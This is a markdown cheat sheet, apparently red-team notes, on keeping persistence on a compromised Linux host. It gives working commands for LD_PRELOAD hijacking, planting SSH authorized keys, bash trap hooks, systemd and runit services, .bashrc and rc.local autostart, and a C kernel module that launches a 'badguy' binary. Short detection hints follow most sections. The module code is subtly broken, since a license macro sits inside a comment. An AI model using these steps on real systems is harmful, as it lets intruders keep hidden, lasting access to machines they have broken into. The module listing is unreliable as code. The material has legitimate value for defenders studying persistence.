
# Linux persistence addons

</br>

* [Non-Root](#non-root)
	* [LD_PRELOAD](#ld_preload)
	* [SSH authorized keys](#SSH-Authorized-Keys)
	* [Trap](#event-triggered-execution-trap)	
	* [Compromise Client Software Binary](#Compromise-Client-Software-Binary)
	* [Add service](#Add-service)
	* [~/.bash_profile and ~/.bashrc](#files-bash_profile-and-bashrc)
* [Root](#root)
	* [rc.local](#rclocal)
	* [Kernel Module Loading](#kml-kernel-module-loading)


</br>


# Non-root

</br>

## LD_PRELOAD
Add your malicious *.so* (with your rewritten *sys.calls*) file to **LD_PRELOAD**
and every program, which use *syscalls* (rewritten by you) will use your functions instead of default syscalls.
#### Examples:

```bash
 echo export LD_PRELOAD=/path/to/badguy.so >> ~/.bashrc
```

or

(***ROOT PRIVILEGES NEEDED!***)

```bash
echo /path/to/badguy.so >> /etc/ld.so.preload

echo export LD_PRELOAD=/path/to/badguy.so >> /etc/profile
```



You can read more on how to build this *.so* here:
*refer: https://xakep.ru/2020/12/29/ld_preload-rootkit/*

#### Detection:
User can see malicious string in */etc/ld.so.preload* or in *~/.bashrc*




</br></br>

##  SSH Authorized Keys
You can store your pub_rsa key in user's home directory to connect via ssh as that user.

#### Examples:
```bash
echo /your_rsa_pub/ >> needed_user_home/.ssh/authorized_keys

```

#### Detection:
User can see malicious strings in **authorized_keys** file

</br></br>

##  Event Triggered Execution: Trap

A built-in bash command that is used to execute a command when the shell receives any signal is called `trap`.

#### Example:

```bash
trap '/path/to/badguy' SIGINT
```

In this example trigger set on *SIGINT* (Ctrl +C ) signal

#### Detection:

User can see malicious activity when she sends defined signals.

</br></br>

## Compromise Client Software Binary

Adversaries may modify client software binaries to establish persistent access to system. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers.

Adversaries may make modifications of client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or libraries) with the backdoored one. Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host.

*refer: https://attack.mitre.org/techniques/T1554/*

</br></br>


## Add service

- ***Systemd***
 	
	#### Example:
	Add your service by modifying this file:
	```bash
	vim ~/.config/systemd/user/badguy.service
	```
	
	or (***ROOT NEEDED!!!***)
	
	```bash
	vim /etc/systemd/system/badguy.service
	```
	
	with this content:
	
	```Unit
	[Unit]
	Description=persistence

	[Service]
	ExecStart=/path/to/badguy
	Restart=always
	RestartSec=60

	[Install]
	WantedBy=default.target
	```
	
	Than, start your service by:
    ```bash
	systemctl --user enable badguy.service

	systemctl --user start badguy.service
	```
	
	or (***ROOT NEEDED!!!***)
	
	```bash
	systemctl enable badguy.service

	systemctl start badguy.service
	```
	
</br>

- ***Runit***  (***ROOT NEEDED!!!***)
	
	If runit is not installed on the system:
	```bash
	sudo apt-get install runit
	```
	
	you need to have file **run** in */etc/sv/badguy* folder(*badguy* == name of your service) like:
	
	```bash
	#!/bin/bash
	
	exec /path/to/badguy_program
	```
	Services, located in  */etc/sv/*, won't execute without links on them in */etc/service/*:
	
	```bash
	ln -s /etc/sv/badguy /etc/service/badguy
	```
	
</br></br>

## Files ~/.bash_profile and ~/.bashrc

Commands written in *~/.bash_profile* will execute with every user login.
Commands written in *~/.bashrc* will execute with every new shell.

#### Examples:
**.bashrc**
```bash
echo /path/to/badguy >> ~/.bashrc
```

**.bash_profile**
```bash
echo /path/to/badguy >> ~/.bash_profile
```

#### Detection:
User can see malicious strings in files **.bashrc** and/or **.bash_profile** 

</br></br>

# Root

</br>

## rc.local

#### Examples:

```bash
echo /path/to/badguy >> /etc/rc.local
```
Add your binary to *rc.local* config. On every system startup your binary will be executed.

#### Detection:
User can see malicious string in */etc/rc.local*

</br></br>

## KML (Kernel Module Loading)
You can load malicious kernel module that starts your binary.


*refer:https://hackersvanguard.com/persistence-with-a-custom-kernel-module/*
#### Example:

Compile this *evil* kernel module with name **badguy.c**

```C
#include <linux/module.h> // included for all kernel modules
#include <linux/init.h> // included for __init and __exit macros MODULE_LICENSE("GPL"); 
MODULE_AUTHOR("You");
MODULE_DESCRIPTION("A Simple shell module");
static int __init shell_init(void) { 
	call_usermodehelper("/path/to/badguy", NULL, NULL, UMH_WAIT_EXEC);
	return 0; // Non-zero return means that the module couldn't be loaded.
} 
static void __exit shell_cleanup(void) { 
	printk(KERN_INFO "Uninstalling Module!\n");
} 
module_init(shell_init);
module_exit(shell_cleanup);
```

with Makefile:

```Makefile
obj-m += badguy.o 
all: 
	make -C /lib/modules/$(shell uname -r)/build M=${PWD} modules
clean: 
	make -C /lib/modules/$(shell uname -r)/build M=${PWD} clean
```

now add your module:

```bash
sudo insmod badguy.ko
```

#### Detection:
User can see malicious module by executing
```bash
lsmod
```


